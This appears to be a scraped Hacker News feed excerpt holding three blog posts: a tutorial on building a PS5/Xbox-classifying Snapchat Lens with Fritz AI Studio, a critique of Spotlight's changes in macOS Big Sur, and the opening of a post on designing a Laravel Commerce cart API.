Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25070088">thread link</a>) | @anupamchugh
<br/>
November 12, 2020 | https://heartbeat.fritz.ai/xbox-or-ps5-enthusiast-create-an-ai-powered-snapchat-lens-with-fritz-ai-studio-471facd3aa5d | <a href="https://web.archive.org/web/*/https://heartbeat.fritz.ai/xbox-or-ps5-enthusiast-create-an-ai-powered-snapchat-lens-with-fritz-ai-studio-471facd3aa5d">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><h2 id="50e6">Computer vision — SnapML</h2><h2 id="a850">Leverage Fritz AI to quickly generate a dataset, train an image labeling model, and deploy directly to Lens Studio</h2><div><div><div><p><a href="https://medium.com/@omarmhaimdat?source=post_page-----471facd3aa5d--------------------------------" rel="noopener"><img alt="Omar M’Haimdat" src="https://miro.medium.com/fit/c/96/96/1*XIWnqvdaUXa8QjxlXcDSnw.jpeg" width="48" height="48"></a></p></div></div></div></div></div><div><div><p id="c3c3">The Playstation 5 and Xbox Series X are coming out just in time for the holidays. If Sony fans and Microsoft fans have already made their choice, some are still hesitating. Both Sony and Microsoft offer next-gen consoles with exclusive games and subscription-based services.</p><p id="fc72">So I thought, in honor of the next generation of gaming…why not create a Snapchat Lens that will classify either console and change the camera overlay accordingly?</p><p id="5c18">If you’ve never heard of <a href="https://lensstudio.snapchat.com/" rel="noopener">Snapchat’s Lens Studio</a>, you can read my primers on both Fritz AI Studio and Lens Studio:</p><p id="7af8">In this article, I will show you how easily you can create a custom machine learning-powered Lens with <strong>almost no code</strong>. Then, we’ll create a Lens that will recognize and classify next-generation consoles (Xbox Series X and PS5).</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/6528/1*qNmI3m9KjvEvOrUlERYLjQ.png" width="3264" height="3030" srcset="https://miro.medium.com/max/552/1*qNmI3m9KjvEvOrUlERYLjQ.png 276w, https://miro.medium.com/max/1104/1*qNmI3m9KjvEvOrUlERYLjQ.png 552w, https://miro.medium.com/max/1280/1*qNmI3m9KjvEvOrUlERYLjQ.png 640w, https://miro.medium.com/max/1400/1*qNmI3m9KjvEvOrUlERYLjQ.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*qNmI3m9KjvEvOrUlERYLjQ.png?q=20"></p></div></div></div><figcaption>Figure 1: Final result</figcaption></figure></div></div></section><section></section><section><div><div><p id="5b40">First, let’s work through building a Lens Studio-ready model with <a href="https://www.fritz.ai/product/snapml.html" rel="noopener">Fritz AI Studio.</a></p><ul><li id="ce7c"><a href="https://docs.fritz.ai/dataset/seed-images/" rel="noopener"><strong>Seed images</strong></a><strong>:</strong> Download images containing the Xbox Series X and PS5, preferably with different angles and light conditions— Unfortunately, since the two consoles haven’t launched yet, you will only find generic press images. I managed to find around 15 good seed images for each class. We’ll use these “seed” images to generate a trainable dataset snapshot.</li></ul></div></div><div><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/6528/1*hnAQz_2-9xk-DJoAjcs59A.png" width="3264" height="2566" srcset="https://miro.medium.com/max/552/1*hnAQz_2-9xk-DJoAjcs59A.png 276w, https://miro.medium.com/max/1104/1*hnAQz_2-9xk-DJoAjcs59A.png 552w, https://miro.medium.com/max/1280/1*hnAQz_2-9xk-DJoAjcs59A.png 640w, https://miro.medium.com/max/1456/1*hnAQz_2-9xk-DJoAjcs59A.png 728w, https://miro.medium.com/max/1632/1*hnAQz_2-9xk-DJoAjcs59A.png 816w, https://miro.medium.com/max/1808/1*hnAQz_2-9xk-DJoAjcs59A.png 904w, https://miro.medium.com/max/1984/1*hnAQz_2-9xk-DJoAjcs59A.png 992w, https://miro.medium.com/max/2000/1*hnAQz_2-9xk-DJoAjcs59A.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*hnAQz_2-9xk-DJoAjcs59A.png?q=20"></p></div></div></div><figcaption>Figure 2: Xbox and PS5 seed images</figcaption></figure></div></div></div><div><div><ul><li id="a568"><strong>Remove the background:</strong> Plenty of services propose a way to remove image backgrounds for free, such as <a href="https://www.remove.bg/" rel="noopener">remove.bg</a> or <a href="https://clippingmagic.com/" rel="noopener">clippingmagic.com</a>. If you don’t want to use these services, <a href="https://www.adobe.com/products/photoshop.html" rel="noopener">Photoshop</a> can be used, as well as Preview (macOS only) or <a href="https://www.gimp.org/" rel="noopener">GIMP</a>. Fritz AI studio will use these images to overly them on thousands of random images.</li></ul></div></div><div><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/6528/1*UmIW-fl17TeqcBgafcKvGg.png" width="3264" height="1632" srcset="https://miro.medium.com/max/552/1*UmIW-fl17TeqcBgafcKvGg.png 276w, https://miro.medium.com/max/1104/1*UmIW-fl17TeqcBgafcKvGg.png 552w, https://miro.medium.com/max/1280/1*UmIW-fl17TeqcBgafcKvGg.png 640w, https://miro.medium.com/max/1456/1*UmIW-fl17TeqcBgafcKvGg.png 728w, https://miro.medium.com/max/1632/1*UmIW-fl17TeqcBgafcKvGg.png 816w, https://miro.medium.com/max/1808/1*UmIW-fl17TeqcBgafcKvGg.png 904w, https://miro.medium.com/max/1984/1*UmIW-fl17TeqcBgafcKvGg.png 992w, https://miro.medium.com/max/2000/1*UmIW-fl17TeqcBgafcKvGg.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*UmIW-fl17TeqcBgafcKvGg.png?q=20"></p></div></div></div><figcaption>Figure 3: Xbox and PS5 images with transparent background</figcaption></figure></div></div></div><div><div><ul><li id="7179"><strong>Annotate:</strong> When all the images are ready, go to Datasets -&gt; Add Image Collection -&gt; Upload images. When all images are uploaded, a whole new menu at the top will appear with an image annotation interface. The process is pretty simple and straightforward, especially for image labeling (classification) models. You start by creating new classes, with each one having a different color. In my case, I have two classes (xbox, ps5)—it took only few seconds using the keyboard shortcuts. You can also use this annotation workflow for other ML tasks, including object detection and image segmentation.</li></ul></div></div><div><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/5760/1*Z6xxUP6hjEtwzZUGi85C4Q.png" width="2880" height="1432" srcset="https://miro.medium.com/max/552/1*Z6xxUP6hjEtwzZUGi85C4Q.png 276w, https://miro.medium.com/max/1104/1*Z6xxUP6hjEtwzZUGi85C4Q.png 552w, https://miro.medium.com/max/1280/1*Z6xxUP6hjEtwzZUGi85C4Q.png 640w, https://miro.medium.com/max/1456/1*Z6xxUP6hjEtwzZUGi85C4Q.png 728w, https://miro.medium.com/max/1632/1*Z6xxUP6hjEtwzZUGi85C4Q.png 816w, https://miro.medium.com/max/1808/1*Z6xxUP6hjEtwzZUGi85C4Q.png 904w, https://miro.medium.com/max/1984/1*Z6xxUP6hjEtwzZUGi85C4Q.png 992w, https://miro.medium.com/max/2000/1*Z6xxUP6hjEtwzZUGi85C4Q.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*Z6xxUP6hjEtwzZUGi85C4Q.png?q=20"></p></div></div></div><figcaption>Figure 4: Annotate images — Use hotkeys to speed up the process, click (1 + e) for xbox and (2 + e) for ps5</figcaption></figure></div></div></div><div><div><ul><li id="3061"><strong>Generate a snapshot:</strong> This is where all the magic happens. With your labeled seed images, Fritz AI will create <a rel="noopener" href="https://heartbeat.fritz.ai/synthetic-data-a-bridge-over-the-data-moat-29f392a52f27"><strong>synthetic images</strong></a> based on your original images, with some sort of data augmentation built-in. You can also monitor how many images have been generated. You will receive an email when the process is finished.</li></ul></div></div><div><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/4932/1*nuHQ9QvrvzkWrReIFUNA_Q.png" width="2466" height="794" srcset="https://miro.medium.com/max/552/1*nuHQ9QvrvzkWrReIFUNA_Q.png 276w, https://miro.medium.com/max/1104/1*nuHQ9QvrvzkWrReIFUNA_Q.png 552w, https://miro.medium.com/max/1280/1*nuHQ9QvrvzkWrReIFUNA_Q.png 640w, https://miro.medium.com/max/1456/1*nuHQ9QvrvzkWrReIFUNA_Q.png 728w, https://miro.medium.com/max/1632/1*nuHQ9QvrvzkWrReIFUNA_Q.png 816w, https://miro.medium.com/max/1808/1*nuHQ9QvrvzkWrReIFUNA_Q.png 904w, https://miro.medium.com/max/1984/1*nuHQ9QvrvzkWrReIFUNA_Q.png 992w, https://miro.medium.com/max/2000/1*nuHQ9QvrvzkWrReIFUNA_Q.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*nuHQ9QvrvzkWrReIFUNA_Q.png?q=20"></p></div></div></div><figcaption>Figure 5: Snapshot image preview with three classes — Xbox, PS5 and neither</figcaption></figure></div></div></div><div><div><ul><li id="2221"><strong>Train a classification model:</strong> When the snapshot is ready, you can start the training job by selecting your snapshot and choosing the number of hours for the training budget — note that Fritz AI will send you an email when the training process is finished. It will also stop the training if the model converges before the assigned training hours.</li></ul></div></div><div><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/4748/1*4lb4Zo04zhAYhDheyMkIvw.png" width="2374" height="1118" srcset="https://miro.medium.com/max/552/1*4lb4Zo04zhAYhDheyMkIvw.png 276w, https://miro.medium.com/max/1104/1*4lb4Zo04zhAYhDheyMkIvw.png 552w, https://miro.medium.com/max/1280/1*4lb4Zo04zhAYhDheyMkIvw.png 640w, https://miro.medium.com/max/1456/1*4lb4Zo04zhAYhDheyMkIvw.png 728w, https://miro.medium.com/max/1632/1*4lb4Zo04zhAYhDheyMkIvw.png 816w, https://miro.medium.com/max/1808/1*4lb4Zo04zhAYhDheyMkIvw.png 904w, https://miro.medium.com/max/1984/1*4lb4Zo04zhAYhDheyMkIvw.png 992w, https://miro.medium.com/max/2000/1*4lb4Zo04zhAYhDheyMkIvw.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*4lb4Zo04zhAYhDheyMkIvw.png?q=20"></p></div></div></div><figcaption>Figure 6: Monitor the training process</figcaption></figure></div></div></div></section><section><div><div><p id="b09f">I am not a designer by any means—thus I’ve used <a href="https://www.canva.com/" rel="noopener">Canvas</a> to create two very simple images that will appear at the bottom of the screen to signify that you are an Xbox fan or a PS5 fan.</p></div></div><div><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/6528/1*lURKmLcxc1MqwkFuICEtbg.png" width="3264" height="958" srcset="https://miro.medium.com/max/552/1*lURKmLcxc1MqwkFuICEtbg.png 276w, https://miro.medium.com/max/1104/1*lURKmLcxc1MqwkFuICEtbg.png 552w, https://miro.medium.com/max/1280/1*lURKmLcxc1MqwkFuICEtbg.png 640w, https://miro.medium.com/max/1456/1*lURKmLcxc1MqwkFuICEtbg.png 728w, https://miro.medium.com/max/1632/1*lURKmLcxc1MqwkFuICEtbg.png 816w, https://miro.medium.com/max/1808/1*lURKmLcxc1MqwkFuICEtbg.png 904w, https://miro.medium.com/max/1984/1*lURKmLcxc1MqwkFuICEtbg.png 992w, https://miro.medium.com/max/2000/1*lURKmLcxc1MqwkFuICEtbg.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*lURKmLcxc1MqwkFuICEtbg.png?q=20"></p></div></div></div><figcaption>Figure 7: Xbox and PS5 pop up images</figcaption></figure></div></div></div></section><section></section><section><div><div><p id="cae1">Now that we have our ML model, we need to import it into Lens Studio and create our Lens.</p><ul><li id="fa96"><strong>Open the project:</strong> Open the <code>.lsproj</code> file from the project zip file provided by Fritz AI Studio. A prompt will pop up — just click on import.</li></ul><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/5760/1*o0s0XnCBPlMaDZGgSWJ_3Q.png" width="2880" height="902" srcset="https://miro.medium.com/max/552/1*o0s0XnCBPlMaDZGgSWJ_3Q.png 276w, https://miro.medium.com/max/1104/1*o0s0XnCBPlMaDZGgSWJ_3Q.png 552w, https://miro.medium.com/max/1280/1*o0s0XnCBPlMaDZGgSWJ_3Q.png 640w, https://miro.medium.com/max/1400/1*o0s0XnCBPlMaDZGgSWJ_3Q.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*o0s0XnCBPlMaDZGgSWJ_3Q.png?q=20"></p></div></div></div><figcaption>Figure 8: Download and open the Lens Studio project</figcaption></figure><ul><li id="6e58"><strong>Import the model as an ML Component:</strong> In the left Objects panel of Lens Studio, you will find an object called <code>ML Component</code>. Click on it and import the model from the right panel (left image in <em>Figure 10</em>). Since the model file is already in the project structure, Lens Studio is able to recognize it. I highly recommend changing the threshold (model’s prediction confidence) to something higher than 0.5 in order to avoid false positives — I chose to set it to 0.8. The model’s threshold can be found in the <code>Classification Controller</code> file (Right image in <em>Figure 10</em>).</li></ul></div></div><div><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3200/0*56y47Py2Cr51vbkl.png" width="1600" height="1348" srcset="https://miro.medium.com/max/552/0*56y47Py2Cr51vbkl.png 276w, https://miro.medium.com/max/1104/0*56y47Py2Cr51vbkl.png 552w, https://miro.medium.com/max/1280/0*56y47Py2Cr51vbkl.png 640w, https://miro.medium.com/max/1456/0*56y47Py2Cr51vbkl.png 728w, https://miro.medium.com/max/1632/0*56y47Py2Cr51vbkl.png 816w, https://miro.medium.com/max/1808/0*56y47Py2Cr51vbkl.png 904w, https://miro.medium.com/max/1984/0*56y47Py2Cr51vbkl.png 992w, https://miro.medium.com/max/2000/0*56y47Py2Cr51vbkl.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/0*56y47Py2Cr51vbkl.png?q=20"></p></div></div></div><figcaption>Figure 9: Import the model</figcaption></figure></div></div></div><div><div><ul><li id="ca64"><strong>Change the input Texture:</strong> In the <code>ML Component</code> file, change the input texture to <code>Textures &gt; Device Camera Texture</code>. At this point, the Lens can classify consoles.</li></ul></div></div><div><figure><div role="button" tabindex="0"><div><p><img alt="Image for post" src="https://miro.medium.com/max/6528/1*NHfJVcbjmsUVVRb9JKcdJQ.png" width="3264" height="651" srcset="https://miro.medium.com/max/552/1*NHfJVcbjmsUVVRb9JKcdJQ.png 276w, https://miro.medium.com/max/1104/1*NHfJVcbjmsUVVRb9JKcdJQ.png 552w, https://miro.medium.com/max/1280/1*NHfJVcbjmsUVVRb9JKcdJQ.png 640w, https://miro.medium.com/max/1456/1*NHfJVcbjmsUVVRb9JKcdJQ.png 728w, https://miro.medium.com/max/1632/1*NHfJVcbjmsUVVRb9JKcdJQ.png 816w, https://miro.medium.com/max/1808/1*NHfJVcbjmsUVVRb9JKcdJQ.png 904w, https://miro.medium.com/max/1984/1*NHfJVcbjmsUVVRb9JKcdJQ.png 992w, https://miro.medium.com/max/2160/1*NHfJVcbjmsUVVRb9JKcdJQ.png 1080w, https://miro.medium.com/max/2700/1*NHfJVcbjmsUVVRb9JKcdJQ.png 1350w, https://miro.medium.com/max/3240/1*NHfJVcbjmsUVVRb9JKcdJQ.png 1620w, https://miro.medium.com/max/3780/1*NHfJVcbjmsUVVRb9JKcdJQ.png 1890w, https://miro.medium.com/max/4320/1*NHfJVcbjmsUVVRb9JKcdJQ.png 2160w, https://miro.medium.com/max/4800/1*NHfJVcbjmsUVVRb9JKcdJQ.png 2400w" sizes="100vw" data-old-src="https://miro.medium.com/max/60/1*NHfJVcbjmsUVVRb9JKcdJQ.png?q=20"></p></div></div><figcaption>Figure 10: Select the ML Model (Left images), change the Texture (Middle image), and change the model threshold</figcaption></figure></div><div><div><ul><li id="16ef"><strong>Change the script:</strong> In the left <code>Resources</code> panel, you can find a folder called <code>Scripts &gt; Classification Helpers</code> containing all the <code>.js</code> files. We will change the <code>ClassificationExampleHelper</code> file with the following code:</li></ul><figure><div></div></figure><ul><li id="e37c"><strong>Add the images and set up the text colors:</strong> By setting the inputs in the script above, Lens Studio will automatically add a menu where you can upload the Xbox and PS5 banners and set the custom colors for each console.</li></ul></div></div><div><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/5760/1*Scx4ag9bXE3kEuleoHmRsQ.png" width="2880" height="1706" srcset="https://miro.medium.com/max/552/1*Scx4ag9bXE3kEuleoHmRsQ.png 276w, https://miro.medium.com/max/1104/1*Scx4ag9bXE3kEuleoHmRsQ.png 552w, https://miro.medium.com/max/1280/1*Scx4ag9bXE3kEuleoHmRsQ.png 640w, https://miro.medium.com/max/1456/1*Scx4ag9bXE3kEuleoHmRsQ.png 728w, https://miro.medium.com/max/1632/1*Scx4ag9bXE3kEuleoHmRsQ.png 816w, https://miro.medium.com/max/1808/1*Scx4ag9bXE3kEuleoHmRsQ.png 904w, https://miro.medium.com/max/1984/1*Scx4ag9bXE3kEuleoHmRsQ.png 992w, https://miro.medium.com/max/2000/1*Scx4ag9bXE3kEuleoHmRsQ.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*Scx4ag9bXE3kEuleoHmRsQ.png?q=20"></p></div></div></div><figcaption>Figure 11: Upload the images and set the colors</figcaption></figure></div></div></div></section><section><div><div><p id="e133">While the model was good, I did notice that it has issues classifying PS5, perhaps because it’s hard to differentiate from a white background—but that’s purely speculative since I don’t have much information about the training metrics.</p><p id="aa48">I decided to add more images from <a href="https://www.youtube.com/watch?v=QtMzV73NAgk" rel="noopener">MKBHD’s video</a> of the unboxing of the PS5 and create a much bigger Snapshot of 6,000 images rather than 3,200 images. I also trained the model from the first existing Keras checkpoint, which is basically the first iteration.</p><p id="066e">The model is now much better at classifying the consoles. I have also noticed that when you keep the camera open for more than 30 seconds, the frames drop and the phone (tested on an iPhone X) gets very warm.</p><p id="5747">The project is nowhere near ready to be used by end-users, there are a lot of things that could be added to improve the whole experience in terms of design, or even other elements like music. The possibilities are endless and are likely easy to implement for Snapchat Lens Creators. There is also room to make it even more interesting by adding a class label PC gaming enthusiasts as well!</p></div></div></section><section><div><div><p id="6f00"><em>Editor’s Note:</em><a href="http://heartbeat.fritz.ai/" rel="noopener"><em> </em><strong><em>Heartbeat</em></strong></a><strong><em> </em></strong><em>is a contributor-driven online publication and community dedicated to exploring the emerging intersection of mobile app development and machine learning. We’re committed to supporting and inspiring developers and engineers from all walks of life.</em></p><p id="aa05"><em>Editorially independent, Heartbeat is sponsored and published by</em><a href="http://fritz.ai/" rel="noopener"><em> </em><strong><em>Fritz AI</em></strong></a><em>, the machine learning platform that helps developers teach devices to see, hear, sense, and think. We pay our contributors, and we don’t sell ads.</em></p><p id="8077"><em>If you’d like to contribute, head on over to our</em><a rel="noopener" href="https://heartbeat.fritz.ai/call-for-contributors-october-2018-update-fee7f5b80f3e"><em> </em><strong><em>call for contributors</em></strong></a><em>. You can also sign up to receive our weekly newsletters (</em><a href="https://www.deeplearningweekly.com/" rel="noopener"><strong><em>Deep Learning Weekly</em></strong></a><em> and the </em><a href="https://www.fritz.ai/newsletter/?utm_campaign=fritzai-newsletter&amp;utm_source=heartbeat-statement" rel="noopener"><strong><em>Fritz AI Newsletter</em></strong></a><em>), join us on</em><a href="https://join.slack.com/t/fritz-ai-community/shared_invite/enQtNTY5NDM2MTQwMTgwLWU4ZDEwNTAxYWE2YjIxZDllMTcxMWE4MGFhNDk5Y2QwNTcxYzEyNWZmZWEwMzE4NTFkOWY2NTM0OGQwYjM5Y2U" rel="noopener"><em> </em></a><a href="http://fritz.ai/slack" rel="noopener"><strong><em>Slack</em></strong></a><em>, and follow Fritz AI on</em><a href="https://twitter.com/fritzlabs" rel="noopener"><em> </em><strong><em>Twitter</em></strong></a><em> for all the latest in mobile machine learning.</em></p></div></div></section></div></div>]]>
            </description>
            <link>https://heartbeat.fritz.ai/xbox-or-ps5-enthusiast-create-an-ai-powered-snapchat-lens-with-fritz-ai-studio-471facd3aa5d</link>
            <guid isPermaLink="false">hacker-news-small-sites-25070088</guid>
            <pubDate>Thu, 12 Nov 2020 14:19:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Spotlight Changes in macOS 11 Big Sur]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25069943">thread link</a>) | @brandonhorst
<br/>
November 12, 2020 | https://lacona.app/blog/2020/11/11/spotlight-changes-in-big-sur | <a href="https://web.archive.org/web/*/https://lacona.app/blog/2020/11/11/spotlight-changes-in-big-sur">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>macOS 11 Big Sur changed Spotlight to bring it more in line with iPadOS search. These changes are intended to simplify things, but they create inconsistencies that may be confusing both to newcomers and to long-time users.</p>

<p>Ultimately, there are three interconnected changes: <a href="#spotlight-11-hidden-previews">hidden previews</a>, <a href="#spotlight-11-disclosure-indicators">disclosure indicators</a>, and <a href="#spotlight-11-suggestions">suggestions</a>. This post will analyze the changes and provide <a href="#spotlight-11-recommendations">recommendations</a> to help frustrated users.</p>

<p>Of course, I believe that <a href="https://lacona.app/">Lacona</a> is an alternative to Spotlight that is both more usable and more powerful, but I won’t be making comparisons to Lacona in this analysis.</p>



<p>Just as before, you call up Spotlight by pressing <code>⌘+Space</code>, or by clicking the magnifying glass icon in the menu bar. However, things change once you start typing.</p>

<p>In macOS X, Spotlight showed your <em>search results</em> in a list on the left side, with a <em>preview</em> on the right side. In Big Sur, the search results are presented in a single list, with no visible preview.</p>

<p><img src="https://lacona.app/img/posts/spotlight-1.png" alt="Spotlight &quot;app&quot; screenshot"></p>

<p>These previews—which were originally introduced as a headlining feature of macOS 10.10 Yosemite—are not actually gone, just hidden. Clicking on a result, or pressing <code>Tab</code> will show the preview.</p>

<p>It’s clear that hiding the preview is an attempt to make the interface appear simpler and more iOS-like. Indeed, it frees up space; but the new space isn’t actually used for anything. For most queries, this space is left completely empty. What’s worse, this whitespace visually separates the results from the crucial new interface element on the far right side, the <em>disclosure indicator</em>.</p>

<h2 id="spotlight-11-disclosure-indicators">Disclosure Indicators</h2>

<p>Some results have a small iOS-style arrow on the far right side. Apple refers to this arrow as a disclosure indicator. It indicates that pressing <code>Return</code> on this result will not open anything, but will instead display the preview on the right side of the window.</p>

<p>Once the preview is displayed, pressing <code>Return</code> again will open the result, even though the disclosure indicator is still present.</p>

<p><img src="https://lacona.app/img/posts/spotlight-2.png" alt="Spotlight &quot;apple stock&quot; screenshot"></p>

<p>These results can be very useful! However, for the first time in Spotlight’s history, ambiguity is introduced to the <code>Return</code> key. Some may consider this necessary complexity, but it’s not the last inconsistency we’ll see today.</p>

<h2 id="spotlight-11-suggestions">Suggestions</h2>

<p>In addition to showing search results, Spotlight now has an additional unlabeled section which I call <em>suggestions</em>. Directly below the unlabeled “top results” section for any given search, there is a section containing a handful of queries that Spotlight believes you may be typing. Some of these queries show the icon of your default web browser, and others show a Spotlight icon and have a disclosure indicator. The number and order of these results varies, but they could take up as much as 83% of the results “above the fold”.</p>

<p><img src="https://lacona.app/img/posts/spotlight-3.png" alt="Spotlight &quot;apple&quot; screenshot"></p>

<p>These suggestions are based on both “Siri Suggestions” and the files of your Mac. This behavior is interesting, but I can’t say it’s very useful; the files referenced always show up further down on the list.</p>

<p>When selecting one of the results with the web browser icon, Spotlight will search for the query using your default web search engine in your default browser.</p>

<p>When selecting one of the results with the Spotlight icon, your input query will change to the suggestion, and the preview will also be shown.</p>

<h4 id="the-problem-with-suggestions">The Problem with Suggestions</h4>

<p>The most important inconsistencies with these suggestions come when using the mouse. Since the inception of OSX, clicking has meant <em>select</em>. Single-click a file in Finder or a track in Music, and it will be selected. This is how Spotlight used to work, and all non-suggestion results in Spotlight still work this way.</p>

<p>However, for suggestion results, clicking will <em>activate them immediately</em>. This, you may notice, is the way things work on iPadOS. Not only is this inconsistent with macOS in general, it is inconsistent with other results <em>on the very same list</em>. Worse still, because the suggestions section is unlabeled, it becomes harder to figure out exactly what clicking on a result will do.</p>

<p>Even with the keyboard, these suggestions behave completely differently from all other results. I originally tried to write out all different cases, but the inconsistencies are too numerous to list with text. I’ve attached an <a href="#spotlight-11-appendix">appendix</a> enumerating all the cases.</p>

<p>Overall, the suggestions section is Spotlight’s biggest step backward in usability. Its behavior is inconsistent and confusing, it takes up huge portions of the most important result space, and its utility is situational at best. Worst of all, this is the only section which cannot be fully disabled in the Spotlight preferences. <em>You’re stuck with it.</em></p>

<h2 id="spotlight-11-recommendations">Recommendations</h2>

<p>To make your search experience better, here are some recommendations:</p>

<ul>
  <li>Expand the window by dragging from the bottom, so that more results can be displayed.</li>
  <li>Ignore the “suggestions” section and its inconsistent behavior.</li>
  <li>Consider disabling “Siri Suggestions” in the Spotlight preferences, which removes many (but not all) of the suggestions.</li>
  <li>Don’t rely on the mouse for selecting items. Use the <code>⌘+Down</code> and <code>⌘+Up</code> shortcuts to quickly move the selection between entire sections with the keyboard.</li>
  <li>Press <code>Tab</code> whenever you want to see a Preview of the results.</li>
  <li>Consider using a Spotlight alternative with a more considered design.</li>
</ul>

<h2 id="conclusion">Conclusion</h2>

<p>Spotlight in macOS 11 Big Sur is torn between two between different worlds.</p>

<p>In one dimension, it introduced iOS ideas like disclosure indicators and single-tap actions for its new features. However, it only went half way, leading to an inconsistent and unpredictable experience.</p>

<p>In another dimension, it is trying to introduce AI-powered suggestions to make Spotlight more proactive and Siri-like. However, these suggestions are too constrained by the existing Spotlight interface to be very useful, and take up valuable space that could be used for the more reliable features.</p>

<p>In future releases, I hope that Apple can push Spotlight fully into simplified iOS paradigm, or retreat to the power of macOS. In macOS 11 Big Sur, it tries to straddle the line and fails at both.</p>

<h2 id="spotlight-11-appendix">Appendix: Behavior Changes</h2>

<h4 id="spotlight-behavior-in-macos-1015-catalina-and-prior">Spotlight Behavior in macOS 10.15 Catalina (and Prior)</h4>

<table>
  <thead>
    <tr>
      <th>&nbsp;</th>
      <th>Return</th>
      <th>Click</th>
      <th>Double Click</th>
      <th>⌘+Return</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>File Result</td>
      <td>Open</td>
      <td>Select</td>
      <td>Open</td>
      <td>Show in Finder</td>
    </tr>
    <tr>
      <td>Other Result</td>
      <td>Open</td>
      <td>Select</td>
      <td>Open</td>
      <td>Open</td>
    </tr>
  </tbody>
</table>

<h4 id="spotlight-behavior-in-macos-11-big-sur">Spotlight Behavior in macOS 11 Big Sur</h4>

<table>
  <thead>
    <tr>
      <th>&nbsp;</th>
      <th>Return</th>
      <th>Tab</th>
      <th>Click (Selected)</th>
      <th>Click (Unselected)</th>
      <th>Double Click</th>
      <th>⌘+Return</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>File Result</td>
      <td>Open</td>
      <td>Show preview</td>
      <td>Open</td>
      <td>Select and show preview</td>
      <td>Open</td>
      <td>Show in Finder</td>
    </tr>
    <tr>
      <td>Web Result</td>
      <td>Open</td>
      <td>Show preview</td>
      <td>Open</td>
      <td>Select and show preview</td>
      <td>Open</td>
      <td>Show preview</td>
    </tr>
    <tr>
      <td>Result with disclosure indicator</td>
      <td>Show preview</td>
      <td>Show preview</td>
      <td>Show preview</td>
      <td>Select and show preview</td>
      <td>Open</td>
      <td>None</td>
    </tr>
    <tr>
      <td>Previewed result with disclosure indicator</td>
      <td>Open</td>
      <td>None</td>
      <td>Open</td>
      <td>Select</td>
      <td>Open</td>
      <td>None</td>
    </tr>
    <tr>
      <td>Spotlight Completion</td>
      <td>Modify input</td>
      <td>Select input</td>
      <td>Modify input</td>
      <td>Modify input</td>
      <td>Modify input</td>
      <td>None</td>
    </tr>
    <tr>
      <td>Browser Completion</td>
      <td>Open</td>
      <td>Select input</td>
      <td>Open</td>
      <td>Open</td>
      <td>Open</td>
      <td>None</td>
    </tr>
    <tr>
      <td>Other Result</td>
      <td>Open</td>
      <td>Show preview</td>
      <td>Open</td>
      <td>Select and show preview</td>
      <td>Open</td>
      <td>Open</td>
    </tr>
  </tbody>
</table>
</div></div>]]>
            </description>
            <link>https://lacona.app/blog/2020/11/11/spotlight-changes-in-big-sur</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069943</guid>
            <pubDate>Thu, 12 Nov 2020 14:06:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Imagination Driven Development]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25069916">thread link</a>) | @yiddishe-kop
<br/>
November 12, 2020 | https://blog.yiddishe-kop.com/posts/imagination-driven-development | <a href="https://web.archive.org/web/*/https://blog.yiddishe-kop.com/posts/imagination-driven-development">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p>The nice thing about creating your own software from scratch is that you can make it work just like your wildest imaginations. When writing the developer exposed API for the <a href="https://laravel-commerce.yiddishe-kop.com/" rel="noopener noreferrer" target="_blank">Laravel Commerce</a> PHP package, I started by creating the high level methods, in a way that I would want them to look. I wanted the API to be as simple and expressive as possible, so it's a pleasure to work with. Inspired by Laravel of course 😎 .</p><h2>Laravel Commerce Package</h2><p>After searching for a simple ecommerce package for Laravel and not finding a lightweight simple to use solution - I decided to attempt to create one myself.</p><p>So where do we start?</p><p>When thinking about ecommerce the first thing that comes to mind is the <strong>cart</strong> (products come first, but is not part of the package, but part of every application itself). So let's imagine how we'd like to be able to interact with the cart. First up - add products to the cart, hmm... I think it couldn’t get simpler than this:</p><pre spellcheck="false">Cart::add($product);
</pre><p>But what if we want to set the quantity to add? 🤔 This looks nice:</p><pre spellcheck="false">Cart::add($product, <span>int</span> $quantity);
</pre><p>It would be nice to be able to remove a product from the cart as well...</p><pre spellcheck="false">Cart::remove($product);
</pre><p>Wouldn't it be nice to be able to empty the whole cart in one go?</p><pre spellcheck="false">Cart::empty(); 
